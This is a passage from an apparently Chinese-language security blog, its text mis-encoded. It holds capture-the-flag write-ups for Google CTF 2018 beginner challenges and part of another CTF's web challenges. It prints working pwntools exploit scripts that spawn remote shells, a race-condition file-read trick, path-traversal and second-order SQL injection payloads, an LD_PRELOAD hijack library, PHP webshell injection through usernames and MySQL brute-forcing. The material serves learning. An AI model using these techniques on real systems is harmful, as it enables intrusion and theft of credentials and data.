src="/2018/08/15/google-ctf-beginner-part2/2.png"><p>è¿™é‡ŒifæˆåŠŸçš„è¯å°±ä¼šæ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œè¯»å–opençš„æ–‡ä»¶è¾“å‡ºå‡ºæ¥ã€‚è¿™é‡Œåº”è¯¥æ˜¯é‡ç‚¹ï¼Œæœ‰è¯»å†™æ“ä½œã€‚</p><p>å¦‚æœæˆ‘ä»¬è¯»çš„æ–‡ä»¶æ˜¯<code>/secret_cake_recipe</code>é‚£ä¹ˆåªè¦è§¦å‘signalä»¥åŠæ»¡è¶³ifåˆ¤æ–­å°±å¯ä»¥æ‹¿åˆ°æ•°æ®ã€‚è¿™é‡Œå¯ä»¥ç”¨<code>ln -s</code>è½¯é“¾æ¥ç”Ÿæˆ<code>dev/console</code>ï¼Œç„¶åæˆ‘ä»¬æ‰§è¡Œè¯¥ç¨‹åºåŒæ—¶å‘é€SIGTERMä¿¡å·å°±å¯ä»¥è¶Šæƒæ‹¿åˆ°æ•°æ®ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦è®©ç¨‹åºå»¶é•¿è¿è¡Œæ—¶é—´æ‰è¡Œï¼Œå¦‚æœè¿è¡Œæ—¶é—´ä¸è¶³ï¼Œè¿˜æ²¡æ¥æ”¶åˆ°ä¿¡å·å°±ç»“æŸäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>, <span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>, write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr - <span class="number">0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span> + pack(<span class="string">"&lt;Q"</span>, system_addr) + <span class="string">"\n"</span>)</span><br><span class="line">r.send(<span class="string">"/bin/sh\n"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '#!/bin/bash' &gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'mkdir dev' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'ln -s /secret_cake_recipe dev/console' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '/home/user/holey_beep &#123;1..4096&#125; &amp;' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'pkill holey_beep -SIGTERM' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"chmod +x pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"./pwn.sh\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦å¤šè¯•å‡ æ¬¡æ¥è§¦å‘æ¡ä»¶ç«äº‰ï¼Œæœ€åæ‹¿åˆ°flag</p><img src="/2018/08/15/google-ctf-beginner-part2/3.png"><h2 id="Admin-UI-PWN-RE"><a href="#Admin-UI-PWN-RE" class="headerlink" title="Admin UI(PWN+RE)"></a>Admin UI(PWN+RE)</h2><p>çœ‹äº†é¢˜ç›®çš„ä»‹ç»ï¼Œå†åŠ ä¸Šè¿™ä¸ªè¡¥ä¸ä¿¡æ¯ï¼ŒçŸ¥é“äº†æœ‰è·¯å¾„ç©¿è¶Šæ¼æ´ã€‚è€Œä¸€çœ‹æä¾›çš„åŠŸèƒ½ä¸­åªæœ‰ç¬¬äºŒä¸ªé€‰é¡¹æœ‰è¯»çš„æ“ä½œï¼Œç„¶åè¯•äº†ä¸€ä¸‹<code>../../../../../../../../../../../etc/passwd</code>ï¼Œæœç„¶è¯»åˆ°äº†passwdæ–‡ä»¶ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/4.png"><p>é‚£ä¹ˆå‰©ä¸‹æ¥çš„å°±åªæ˜¯å¯»æ‰¾è¦è¯»çš„æ–‡ä»¶äº†ã€‚</p><p>é€šè¿‡ä½¿ç”¨<code>../../../../../../proc/self/cmdline</code>å¾—åˆ°è¿è¡Œç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/5.png"><p>å¾—åˆ°è¿è¡Œç¨‹åºçš„å‘½åï¼Œéœ€è¦çŒœè·¯å¾„ï¼ŒçŒœåˆ°äº†<code>../main</code>ï¼ŒæŠŠè¯»å–åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¿å­˜ä¸‹æ¥ <code>printf &quot;2\n../main\n3\n&quot; | nc mngmnt-iface.ctfcompetition.com 1337 &gt; output.bin</code></p><p>å†é€šè¿‡16è¿›åˆ¶ç¼–è¾‘å™¨æŠŠå¤šä½™çš„ç›®å½•åˆ æ‰ï¼Œè¿™æ ·å°±å¾—åˆ°äº†æœåŠ¡å™¨ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>æµè§ˆä»£ç ï¼Œåœ¨éªŒè¯ç™»å½•çš„è¿‡ç¨‹ä¸­æ‰“å¼€äº†<code>flag</code>æ–‡ä»¶ï¼Œç„¶åæ¯”è¾ƒè¾“å…¥ã€‚è¿™æ ·ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œç›´æ¥è¯»<code>../flag</code>å°±å¯ä»¥æ‹¿åˆ°flagã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/6.png"><h2 id="Admin-UI-2-PWN-RE"><a href="#Admin-UI-2-PWN-RE" class="headerlink" title="Admin UI 2(PWN+RE)"></a>Admin UI 2(PWN+RE)</h2><p>ç»§ç»­ä¸Šä¸€é¢˜çš„ç¨‹åºåˆ†æç¬¬äºŒä¸ªå¯†ç </p><img src="/2018/08/15/google-ctf-beginner-part2/7.png"><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹æˆ‘ä»¬çš„è¾“å…¥å¼‚æˆ–ä¹‹åä¼šå¾—åˆ°flagæ•°ç»„ä¸­çš„èµ‹å€¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°flagæ•°ç»„çš„å€¼ï¼Œåªè¦å†æ¬¡å¼‚æˆ–å›å»å³å¯å¾—åˆ°å¯†ç ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/8.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_string = [<span class="number">0x84</span>, <span class="number">0x93</span>, <span class="number">0x81</span>, <span class="number">0xbc</span>, <span class="number">0x93</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0x98</span>, <span class="number">0x97</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0x94</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0xb5</span>, <span class="number">0x83</span>, <span class="number">0xbd</span>, <span class="number">0x98</span>, <span class="number">0x85</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb3</span>, <span class="number">0xa2</span>, <span class="number">0xb5</span>, <span class="number">0x98</span>, <span class="number">0xb3</span>, <span class="number">0xaf</span>, <span class="number">0xf3</span>, <span class="number">0xa9</span>, <span class="number">0x98</span>, <span class="number">0xf6</span>, <span class="number">0x98</span>, <span class="number">0xac</span>, <span class="number">0xf8</span>, <span class="number">0xba</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> e_string:</span><br><span class="line">    s ^= <span class="number">0xc7</span></span><br><span class="line">    flag += chr(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/9.png"><h2 id="Admin-UI-3-PWN-RE"><a href="#Admin-UI-3-PWN-RE" class="headerlink" title="Admin UI 3(PWN+RE)"></a>Admin UI 3(PWN+RE)</h2><p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ¼æ´ç‚¹ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç¬¬äºŒä¸ªæ˜¯æ ˆæº¢å‡ºæ¼æ´ï¼Œæˆ‘è¿™é‡Œæ˜¯ä½¿ç”¨çš„æ˜¯æ ˆæº¢å‡ºæ¼æ´ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/10.png"><p>çœ‹åˆ°ç¼“å†²åŒºçš„ä½ç½®ç¦»bpå¯„å­˜å™¨æœ‰0x30çš„è·ç¦»ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/11.png"><p>åˆå› ä¸ºæ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥å†åŠ ä¸Š8ä¸ªå­—èŠ‚çš„RBPï¼Œæœ€ååŠ ä¸Šæˆ‘ä»¬çš„geishellå‡½æ•°åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'mngmnt-iface.ctfcompetition.com'</span>,<span class="number">1337</span>)</span><br><span class="line">shell_add = <span class="number">0x41414349</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"1\n\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"CTF&#123;I_luv_buggy_sOFtware&#125;\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">35</span>+<span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Authenticated"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x38</span> + p64(shell_add))</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/12.png"><h2 id="Firmware-RE"><a href="#Firmware-RE" class="headerlink" title="Firmware(RE)"></a>Firmware(RE)</h2><p>è™½ç„¶æ ‡ç­¾å†™çš„æ˜¯REä½†æ˜¯â€¦â€¦ï¼Œåšå®Œçš„æ„Ÿè§‰å°±æ˜¯ä¸€ä¸ªMISCã€‚</p><p>é¦–å…ˆæ‹¿åˆ°ä¸€ä¸ªzipæ–‡ä»¶ï¼Œè§£å‹ä¹‹åæ˜¯ä¸€ä¸ªgzå‹ç¼©åŒ…ï¼Œå†æ¬¡è§£å‹å¾—åˆ°ext4çš„æ–‡ä»¶ï¼Œæœç´¢ä¹‹åå¾—çŸ¥æ˜¯ä¸€ä¸ªLinuxçš„æ–‡ä»¶ç³»ç»Ÿã€‚ç›´æ¥æŒ‚è½½ä¹‹ï¼Œ<code>mount -t ext4 challenge2.ext4 /mnt</code>ï¼Œéœ€è¦rootæƒé™ã€‚æŒ‚è½½ä¹‹åå¯»æ‰¾çº¿ç´¢ï¼Œæ‰¾äº†ä¸€åœˆåœ¨æ ¹ç›®å½•ä¸‹æœ‰ä¸ªéšè—å‹ç¼©æ–‡ä»¶<code>.mediapc_backdoor_password.gz</code>ï¼Œè§£å‹catä¸€ä¸‹ï¼Œå¾—åˆ°flagã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/13.png"><h2 id="Gatekeepker-RE"><a href="#Gatekeepker-RE" class="headerlink" title="Gatekeepker(RE)"></a>Gatekeepker(RE)</h2><p>ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²é€†åºç¨‹åºï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼šè¢«é€†åºï¼Œç„¶åå’Œ<code>zLl1ks_d4m_T0g_I</code>æ¯”è¾ƒï¼Œè¿™æ ·å°±ç®€å•äº†ï¼Œç›´æ¥é€†è½¬å›æ¥å°±å¥½ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/14.png"><img src="/2018/08/15/google-ctf-beginner-part2/15.png"><h2 id="Media-DB-MISC"><a href="#Media-DB-MISC" class="headerlink" title="Media-DB(MISC)"></a>Media-DB(MISC)</h2><p>ç»™äº†ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œå¤§æ¦‚çš„åŠŸèƒ½æ˜¯èƒ½è®°å½•æ­Œæ‰‹å’Œæ­Œæ›²çš„ä¸€ä¸ªç®€æ˜“æ§åˆ¶å°ï¼Œè¦æˆ‘ä»¬è·å–oauth_tokenã€‚åœ¨è¾“å…¥ç‚¹ä¸­è¿‡æ»¤äº†å•å¼•å·ï¼Œè€Œä¸”è¾“å…¥ç‚¹åªæœ‰ä¸€ä¸ªæ²¡æœ‰åŠæ³•ä½¿ç”¨\æ¥è½¬ä¹‰å•å¼•å·é€ƒé€¸å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œåªèƒ½å¯»æ‰¾å…¶ä»–æ€è·¯æ¥çªç ´ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/16.png"><p>è§‚å¯Ÿåˆ°è¿™é‡Œæœ‰ä¸€ä¸ªä»æ•°æ®åº“éšæœºè¯»æ­Œæ‰‹çš„æ“ä½œï¼Œå†åŠ ä¸Šä¹‹å‰çš„æ“ä½œå•å¼•å·ï¼ŒåŒå¼•å·è¿‡æ»¤ä¸ä¸€è‡´ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/17.png"><p>é‚£ä¹ˆè¿™é‡Œçš„ä¸ä¸€è‡´æ€§å°±ä¼šé€ æˆäºŒé˜¶æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿‡æ»¤åŒå¼•å·çš„è¾“å…¥ç‚¹ä¸­æ³¨å…¥å¸¦æœ‰å•å¼•å·çš„æ•°æ®ï¼Œç„¶ååœ¨éšæœºè¯»æ­Œæ‰‹çš„æ—¶å€™å•å¼•å·ä¼šè¢«ä»£å…¥SQLè¯­å¥ä¸­é€ æˆSQLæ³¨å…¥ã€‚</p><p><code>xxxx&#39; union select 1,oauth_token from oauth_tokens --</code></p><p>è¿™é‡Œé¡ºå¸¦ä¸€æä¸èƒ½ä½¿ç”¨#æ³¨é‡Šç¬¦ï¼Œå› ä¸º#ç¬¦å·åœ¨pythonä¸­ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ä¼šç ´åè¯­æ³•ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/18.png"><h2 id="Filter-env-PWN"><a href="#Filter-env-PWN" class="headerlink" title="Filter env(PWN)"></a>Filter env(PWN)</h2><p>ç»™äº†Cçš„æºä»£ç ï¼Œä¸»è¦æ“ä½œå°±æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä»£ç ä¸­è¿‡æ»¤äº†ä¸€äº›å¸¸è§çš„ç¯å¢ƒå˜é‡ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/19.png"><p>é—®é¢˜å‡ºåœ¨è¿™ä¸ªè¿‡æ»¤åªæ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡å¤è®¾ç½®ç¯å¢ƒå˜é‡å°±å¯ä»¥äº†ã€‚è¿™é‡Œæ˜¯åˆ©ç”¨LD_PRELOADåŠ«æŒå‡½æ•°ï¼Œæ‰§è¡Œæˆ‘ä»¬ç¼–è¯‘çš„å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __libc_start_main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"/home/adminimum/flag"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(arg[<span class="number">0</span>], arg, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc load.c -o load -shared -fPIC</code>ç”ŸæˆåŠ¨æ€é“¾æ¥æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">load_file = base64.b64encode(open(<span class="string">"load"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"env.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '"</span> + load_file + <span class="string">"' &gt; load.txt\n"</span>)</span><br><span class="line">r.send(<span class="string">"base64 -d load.txt &gt; load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"/home/adminimum/filterenv\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp/load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/20.png"><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­¦åˆ°äº†ä¸€äº›PWNæ–¹é¢çš„çŸ¥è¯†è¿˜æ˜¯ä¸é”™çš„ï¼Œä¸°å¯ŒçŸ¥è¯†é¢ã€‚å°±æ˜¯æƒ³åæ§½è¿™ä¸ªé¢˜ç›®çš„æ ‡ç­¾ï¼Œå¾ˆå¤šéƒ½æ˜¯æŒ‚ç¾Šå¤´å–ç‹—è‚‰ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/21.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Holey-Beep-PWN&quot;&gt;&lt;a href=&quot;#Holey-Beep-PWN&quot; class=&quot;headerlink&quot; title=&quot;Holey Beep(PWN)&quot;&gt;&lt;/a&gt;Holey Beep(PWN)&lt;/h2&gt;&lt;p&gt;Holey Beepæ˜¯CVE-2018-
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>å·…å³°æå®¢CTF éƒ¨åˆ†Webå¤ç°</title>
    <link href="https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/"/>
    <id>https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/</id>
    <published>2018-08-01T05:17:19.000Z</published>
    <updated>2018-08-01T05:23:31.869Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç°äº†ä¸‰é“é¢˜ï¼Œå…¶ä»–çš„éƒ½å…³ç¯å¢ƒäº†ï¼Œè®°å½•ä¸€ä¸‹å¤ç°çš„è¿™ä¸‰é“å§ã€‚</p><h2 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h2><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°çš„onethinkçš„æ¼æ´åˆ†ææ–‡ç« </p><p><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-4918-1-1.html</a></p><p>è¿™ä¸ªæ˜¯åŸç†ç›¸åŒçš„ï¼Œåªä¸è¿‡æ˜¯thinkphp</p><p><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p><p>é€šè¿‡è¿™äº›æˆ‘ä»¬çŸ¥é“ï¼Œé—®é¢˜æ˜¯å‡ºåœ¨ç¼“å­˜çš„å­˜å‚¨ä¸Šï¼Œæˆ‘ä»¬çš„ç”¨æˆ·åè¢«ç®€å•çš„ååºåˆ—åŒ–å­˜å‚¨è¿›äº†ç¼“å­˜æ–‡ä»¶ä¸­ã€‚æ‰€ä»¥è¦getshellçš„è¯æˆ‘ä»¬åªéœ€è¦é€šè¿‡ç”¨æˆ·åä¼ å…¥webshellã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬å¿…é¡»èƒ½çŒœåˆ°ç¼“å­˜æ–‡ä»¶çš„åå­—ã€‚</p><p>åœ¨é¢˜ç›®çš„æ ¹ç›®å½•ä¸‹æ‰«åˆ° www.zip å¾—åˆ°é¢˜ç›®çš„æºç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°filenameçš„å‘½åè§„å¾‹ï¼Œä»¥åŠç›®å½•ã€‚æ¨æµ‹è¿™é‡Œçš„æºç å’Œçº¿ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æ¡ä»¶æ»¡è¶³ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/1.png"><p>æˆ‘ä»¬åœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™ï¼Œåˆ é™¤ Application/Install/Data/install.lock æ–‡ä»¶ï¼Œç„¶åé€šè¿‡install.phpå®‰è£…ï¼Œéšåé€šè¿‡åœ¨æœ¬åœ°ç”Ÿæˆç¼“å­˜æ–‡ä»¶æ¥é¢„æµ‹é¢˜ç›®çš„ç¼“å­˜æ–‡ä»¶ï¼Œæœ€åä»£ç æ‰§è¡Œæ‹¿flagã€‚</p><p>ç”±äºç”¨æˆ·åæœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥åˆ†ä¸¤æ¬¡æ³¨å†Œã€‚ç¬¬ä¸€æ¬¡<code>%0a%0d$x=$_GET[x];\\</code>ï¼Œç¬¬äºŒæ¬¡<code>%0a%0deval($x);\\</code></p><p>æ³¨å†Œä¹‹åå¿…é¡»è¦ç™»å½•ä¸€ä¸‹ï¼Œè¿™æ ·å°±æŠŠwebshellå†™å…¥äº†ç¼“å­˜æ–‡ä»¶ä¸­äº†ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/2.png"><p>ä¹‹ååœ¨é¢˜ç›®ä¸­é‡å¤æ­¥éª¤ï¼Œå°±å¯ä»¥æ‹¿åˆ°webshellï¼Œæ‰§è¡Œä»£ç æœç´¢flag</p><img src="/2018/08/01/dianfengjikeCTF-web/3.png"><h2 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h2><p>è¿™é“é¢˜ä¸€å¼€å§‹æƒ³æ³•æ˜¯é€šè¿‡æ”¶é›†ä¿¡æ¯ç¤¾å·¥å¾—åˆ°flagâ€¦â€¦ï¼Œå…ˆæ˜¯çœ‹åˆ°<a href="mailto:BabyWeb@my.lol" target="_blank" rel="noopener">BabyWeb@my.lol</a>ï¼Œç„¶åè®¿é—®my.lolå¯ä»¥å¾—åˆ°ä¸€ä¸ªqqé‚®ç®±ï¼Œç»“æœè¿™ä¸ªqqæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæ€è·¯å°±æ–­åœ¨è¿™é‡Œäº†ã€‚</p><p>å‚è€ƒäº†å…¶ä»–äººçš„writeupï¼Œå‘ç°è¦é€šè¿‡è¿™äº›ä¿¡æ¯çŒœæµ‹åå°ï¼Œçˆ†ç ´å¯†ç â€¦â€¦åƒè¿™ç§ä¿¡æ¯é‡è¾ƒå°‘çš„é¢˜ç›®ï¼Œéƒ½ä¼šæœ‰ä¸€äº›æ‰«ç›®å½•ï¼Œæ‰«ç«¯å£ï¼Œæ”¶é›†å­åŸŸåä¹‹ç±»çš„æ“ä½œã€‚</p><p>è¾“å…¥<a href="http://106.75.2.4/babyweb" target="_blank" rel="noopener">http://106.75.2.4/babyweb</a> ï¼Œè‡ªåŠ¨è·³è½¬åˆ°<a href="http://106.75.2.4/babyweb/login.php" target="_blank" rel="noopener">http://106.75.2.4/babyweb/login.php</a> ï¼Œçœ‹äº†ä¸€ä¸ªwriteupæœ‰çš„é˜Ÿä¼èƒ½ç›´æ¥æ ¹æ®æ”¶é›†çš„ä¿¡æ¯çˆ†ç ´å‡ºç”¨æˆ·åå’Œå¯†ç ã€‚ã€‚ã€‚è¿™æ“ä½œå¤ªå¼ºäº†ï¼Œæˆ‘æ˜¯æä¸å‡ºæ¥ï¼Œæ‰€ä»¥å°±æŒ‰ç…§å¸¸è§„æ“ä½œæ‰«ç«¯å£ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/4.png"><p>æ ¹æ®æ‰«å‡ºæ¥çš„ç»“æœå¯ä»¥çœ‹åˆ°å¼€æ”¾äº†3306ç«¯å£ï¼Œä½¿ç”¨hydraçˆ†ç ´ä¹‹ã€‚è¿™ä¸ªæˆ‘åœ¨ä¸€å¼€å§‹çš„æ—¶å€™çˆ†ç ´çš„æ˜¯rootç”¨æˆ·ï¼Œç»“æœçœ‹æç¤ºå·²ç»æ”¹æˆå¦å¤–çš„ç”¨æˆ·äº†â€¦â€¦å“­å”§å”§ï¼Œæœ€åæ˜¯åœ¨writeupçš„å¸®åŠ©ä¸‹çŸ¥é“äº†ç”¨æˆ·åä¸ºbabywebï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡ç½‘ç«™çš„ä¿¡æ¯æ¨æµ‹å‡ºæ¥ã€‚</p><p>æ‹¿åˆ°å¯†ç ä¹‹åï¼Œè¿æ¥æ•°æ®åº“ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/5.png"><p>ç„¶è€Œå¹¶æ²¡æœ‰æŸwriteupä¸­æ‰€è¯´çš„ç”¨æˆ·åå¯†ç ï¼Œå¯èƒ½è¢«åˆ 